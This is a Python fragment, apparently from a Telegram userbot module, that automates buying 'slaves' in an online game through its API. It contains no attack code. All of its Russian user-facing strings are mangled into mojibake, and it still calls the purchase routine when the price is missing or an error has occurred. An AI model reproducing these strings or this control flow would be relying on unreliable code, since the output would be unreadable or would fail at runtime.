            await message.edit("‚ùå –ù–µ–≤–µ—Ä–Ω—ã–µ –∞—Ä–≥—É–º–µ–Ω—Ç—ã.\n–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: `.buyslave <slave_id>`")
            return
        slave_id = args[0]
        if not slave_id.isdigit():
            await message.edit("‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç slave_id. –î–æ–ª–∂–µ–Ω –±—ã—Ç—å —á–∏—Å–ª–æ–º.")
            return
        await message.edit(f"üîÑ –ü—ã—Ç–∞—é—Å—å –≤—ã–∫—É–ø–∏—Ç—å —Ä–∞–±–∞ —Å ID {slave_id}...")
        user_data = await self.make_request("get", f"user/{slave_id}")
        if not user_data or "user" not in user_data:
            await message.edit("‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –¥–∞–Ω–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.")
            return
        try:
            user_info = user_data["user"]
            price_to_buy = user_info.get("price", None)
            if price_to_buy is not None:
                await message.edit(f"üí∞ –°—Ç–æ–∏–º–æ—Å—Ç—å –≤—ã–∫—É–ø–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è —Å ID {slave_id}: <b>{price_to_buy}</b> –º–æ–Ω–µ—Ç.", parse_mode="html")
                await self.client.send_message('me', f"üí∞ –°—Ç–æ–∏–º–æ—Å—Ç—å –≤—ã–∫—É–ø–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è —Å ID {slave_id}: <b>{price_to_buy}</b> –º–æ–Ω–µ—Ç.", parse_mode='html')
            else:
                await message.edit("‚ùå –°—Ç–æ–∏–º–æ—Å—Ç—å –≤—ã–∫—É–ø–∞ –Ω–µ —É–∫–∞–∑–∞–Ω–∞ –≤ –¥–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.")
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –¥–∞–Ω–Ω—ã—Ö –≤ getprice: {e}")
            await message.edit(f"‚ùå –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ —Å—Ç–æ–∏–º–æ—Å—Ç–∏ –≤—ã–∫—É–ø–∞. ({e})")
        success = await self.buy_slave(slave_id, price_to_buy)
        if success:
            await message.edit(self.strings["success_buyslave"].format(slave_id))
        else:
            await message.edit(self.strings["error_buyslave"].format(slave_id, "–ù–µ —É–¥–∞–ª–æ—Å—å –≤—ã–∫—É–ø–∏—Ç—å —Ä–∞–±–∞."))

    async def buy_slave(self, slave_id: str, price_to_buy: int) -> bool:
        """–í—ã–∫—É–ø–∞–µ—Ç (–≤–æ—Å—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç) slave –∞–∫–∫–∞—É–Ω—Ç –ø–æ –µ–≥–æ ID."""
        buy_endpoint = self.config["BUY_ENDPOINT"]
        payload = {
            "price": int(price_to_buy),
            "slave_id": int(slave_id)
        }
        response = await self.make_request("post", buy_endpoint, payload)
        if response is not None:
            logger.info(f"–†–∞–± —Å ID {slave_id} —É—Å–ø–µ—à–Ω–æ –≤—ã–∫—É–ø–ª–µ–Ω.")
            await self.notify_me(self.strings["monitor_buyslave"].format(slave_id))
            return True
        else:
            logger.error(f"–ù–µ —É–¥–∞–ª–æ—Å—å –≤—ã–∫—É–ø–∏—Ç—å —Ä–∞–±–∞ —Å ID {slave_id}.")
            return False
    async def get_user_id_from_config_or_default(self, message) -> Optional[str]:
        """–ü–æ–ª—É—á–∞–µ—Ç ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –¥–ª—è –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞."""
        return str(message.from_id)
